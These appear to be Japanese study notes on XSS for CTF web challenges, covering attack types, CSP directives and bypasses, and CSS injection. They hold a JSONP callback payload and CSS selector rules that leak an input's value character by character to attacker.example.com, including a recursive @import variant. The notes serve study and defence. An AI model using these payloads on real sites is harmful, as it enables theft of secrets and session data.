# xss

## 概要

- JS コードへのユーザー入力の埋め込みにより発生する
- すでに JS に埋め込まれているため SOP は適用されない
- XSS を活用した攻撃手法
  - セッションハイジャック -> document.cookie を活用
  - Web ページ内の機密情報 -> document.getElementById('secret')とか
- 異なる web サイトへの誘導
  - location.href を書き換えれば OK

## 種類

- 反射型
- 格納型
- DOM-Based
  - 現在の URL のクエリ文字列(location.search)やフラグメント(location.hash)を用いて DOM を操作する場合
  - e.g. URL のクエリパラメータ(name)に応じて表示される名前 UI が変わる

## 問題形式

- ユーザーの入力値が何らかの形式でエコーバックされる機能
- サイト管理者を模したクローラを、出題対象となる WebApp 内のページに誘導する機能
- サイト管理者をもしたクローラの User-Agent や Cookie、サイト管理者しかアクセスできないページに FLAG がある

## 攻撃手法

- ケース 1: 単純なエコーバック
- ケース 2: 入力値が HTML 要素の props として出力される場合
- ケース 3: 入力値が DOM 操作に利用される場合
  - innerHTML による要素の script 更新は規制されている

## CSP

- 怪しそうなスクリプトを判断する
  - ホスト名: スクリプト配信元のホスト名を指定できる
  - ハッシュ値: 実行可能なスクリプトのハッシュ
  - nonce: HTML 生成時に script タグに nonce を入れておく
- 実際のディレクティブ
  - script-src
    - none: 禁止
    - self: same origin
    - host-source: ホスト名や IP アドレス、URL で指定されたサーバから配信されるスクリプトの実行を許可
    - nonce-<base64-value>
    - <hash-algorithm>-<base64-value>
    - strict-dynamic
      - 親の script タグが nonce によって信頼されている場合、その親が動的に生成した子の script タグを信頼する
      - nonce の管理が問題なければ強力
  - connect-src
    - フロントエンドからの API 通信先を制限
  - default-src
    - ディレクティブで許可しない場合のデフォルト値
  - base-url
    - 第三者が不正に<base>タグを挿入して相対リンクを外部サイトに誘導することを防ぐ
- 近年は CSP をバイパスさせて XSS を発生させるような問題がある
  - JSONP エンドポイント
    - jsonp
      - 外部ファイルの参照を行う script 要素が SOP による制約を受けないことを利用した CrossOrigin リクエストの仕組み
    - <script> src="cdn.example.com/jsonp?callback=alert(1)//"</script>
      - この script 要素によって実行されるコードは cdn.example.com から配信されていることになる
  - Script Gadget
    - テンプレートエンジンやフレームワークなどの動的レンダリング機能を用いる
    - ユーザーが入力した文字列をそのまま実行するガジェットが潜んでいる場合がある
  - base-uri 未設定による相対パス攻撃
  - DOM Clobbering
    - strict-dynamic が設定されている場合に使用
    - <script>要素の挿入はnonceで、<p>タグなどによるスクリプトの挿入はstrict-dynamicでガードされている
- ホストベースの CSP が設定されている場合は上記のような手法を検討する
  - ホストベースではない strict-dynamic/nonce/hash を使おう!
  - csv-evaluator を使おう！

## CSS インジェクション

CSS の前方一致セレクタおよび url 関数を利用する

```css
href[a^='https://']
{
  /* a属性がhttps://から始まるhref要素に適用される */
  color: red;
}

body {
  background: url(https://example.com/background.jpg);
}
```

以下の CSS を注入し input 属性の value の一文字目を当てる（同様に 2 文字目以降も当てる）

```css
input[value^='a'] {
  background: url(https://attacker.example.com?value=a);
}
input[value^='b'] {
  background: url(https://attacker.example.com?value=b);
}
/* ... */
```

ただし以下のデメリットがある

- 一度に全て取得しようとすると value が英語 3 文字だったとしても 26^3=17576 通りのルールが必要(CSS ファイルの上限に引っかかる)
- 故に、value が長ければ長いほど複数回に分ける必要あり
  - 訪問のたびにランダム化される要素の場合は無理

対策として@import 文を使用して 1 回の訪問で再帰的に文字列を取得する方法がある

まずは 1.css を読み込みつつ、1 文字目を特定する。サーバ側では 1.css のリクエストを保留し、特定された 1 文字目に応じて動的に css を生成してレスポンスする

```css
@import url(https://attacker.example.com/1.css);

input[value^='a'] {
  background: url(https://attacker.example.com/leak/a);
}
input[value^='b'] {
  background: url(https://attacker.example.com/leak/b);
}
/* ... */
```

これを繰り返すことで再帰的に value を取得する
